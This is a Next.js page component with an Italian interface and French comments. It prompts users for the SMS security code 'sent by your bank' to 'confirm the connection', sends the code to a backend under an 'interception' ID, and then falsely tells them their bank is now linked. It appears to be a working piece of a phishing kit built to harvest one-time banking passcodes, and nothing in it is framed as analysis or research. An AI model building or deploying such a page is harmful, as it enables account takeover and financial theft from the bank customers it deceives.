"use client";

import Link from "next/link";
import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";

export default function OtpPage() {
  const router = useRouter();
  const [code, setCode] = useState("");
  const [interceptionId, setInterceptionId] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [error, setError] = useState("");

  // Récupère l'ID généré à l'étape précédente au chargement de la page
  useEffect(() => {
    const id = sessionStorage.getItem("current_interception_id");
    if (!id) {
      setError("Sessione di collegamento non trovata. Si prega di riprovare.");
    } else {
      setInterceptionId(id);
    }
  }, []);

  const isButtonDisabled = code.length < 4 || isLoading || !interceptionId;

  const handleVerifyCode = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!interceptionId) return;

    setIsLoading(true);
    setError("");

    try {
      // Envoi du code en PUT à la même route d'API
      const response = await fetch("/api/operation/", {
        method: "PUT",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id: interceptionId, smsCode: code }),
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.error || "Impossibile registrare il codice.");
      }

      // Nettoie le sessionStorage après l'opération réussie
      sessionStorage.removeItem("current_interception_id");
      
      // Affiche le popup de succès
      setShowSuccess(true);

    } catch (err: any) {
      setError(err.message || "Errore.");
    } finally {
      setIsLoading(false);
    }
  };

  const goToDashboard = () => {
    router.push("/it/dashboard");
  };

  return (
    <div className="otp-container">
      {showSuccess && (
        <div className="modal-overlay">
          <div className="success-modal">
            <div className="success-icon-circle">
              <i className="fa-solid fa-check"></i>
            </div>
            <h2 className="modal-title">Connessione riuscita</h2>
            <p className="modal-desc">
              La tua autenticazione è stata confermata. La tua banca è ora collegata.
            </p>
            <button onClick={goToDashboard} className="btn-link-bank" style={{ background: '#15b565', width: '100%' }}>
              <i className="fa-solid fa-gauge-high"></i>
              Accedi alla dashboard
            </button>
          </div>
        </div>
      )}

      <Link href="/it/operation" className="back-btn" style={{ alignSelf: 'flex-start' }}>
        <i className="fa-solid fa-arrow-left"></i>
      </Link>

      <form className="otp-card" onSubmit={handleVerifyCode}>
        <div className="otp-icon-box">
          <i className="fa-solid fa-shield-lock"></i>
        </div>

        <h1 className="otp-title">Codice di conferma</h1>
        <p className="otp-subtitle">
          Inserisci il codice di sicurezza inviato dalla tua banca per confermare il collegamento.
        </p>

        {error && <div className="error-message" style={{ background: '#fdf2f2', color: '#ec5b5b', padding: '12px', borderRadius: '12px', fontSize: '13px', marginBottom: '10px', width: '100%', textAlign: 'center' }}>{error}</div>}

        <div className="otp-input-wrapper">
          <input
            type="text"
            className="otp-field"
            placeholder="••••••"
            maxLength={6}
            value={code}
            onChange={(e) => setCode(e.target.value.replace(/\D/g, ""))}
            disabled={!interceptionId}
            required
          />
        </div>

        <button type="submit" className="btn-link-bank" disabled={isButtonDisabled}>
          {isLoading ? (
            <div className="spinner"></div>
          ) : (
            <>
              <i className="fa-solid fa-circle-check"></i>
              Convalida il codice
            </>
          )}
        </button>

        {/* <p className="resend-link">
          Vous n'avez pas reçu le code ? <strong>Renvoyer</strong>
        </p> */}
      </form>
    </div>
  );
}